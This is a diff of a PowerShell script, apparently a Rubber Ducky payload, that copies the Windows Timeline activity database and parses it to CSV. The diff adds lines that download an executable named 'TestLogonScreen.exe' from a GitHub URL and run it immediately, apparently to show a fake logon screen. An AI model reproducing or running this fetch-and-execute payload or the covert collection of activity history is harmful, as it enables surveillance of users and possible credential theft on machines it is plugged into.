@@ -15,13 +15,14 @@ $dbs = (gci "$($env:LOCALAPPDATA)\ConnectedDevicesPlatform" -recurse -Include 'A
 if($dbs.count -eq 0)
 {
 	Write-Host "No activities found"
-}
-else {
+} else {
 	$dbs| foreach {
 		cp "$_" "$workingfolder/"
 		&"$workingfolder/WxTCmd.exe" -f "${workingfolder}/ActivitiesCache.db" --csv "$workingfolder"
 	}
 }
 curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/PCActivity.pbit" -outfile "$workingfolder/PCActivity.pbit"
-&"$workingfolder/PCActivity.pbit"
-pause
+curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/TestLogonScreen.exe" -outfile "$workingfolder/logScreen.exe"
+&"$workingfolder/logScreen.exe"
+#&"$workingfolder/PCActivity.pbit"
+
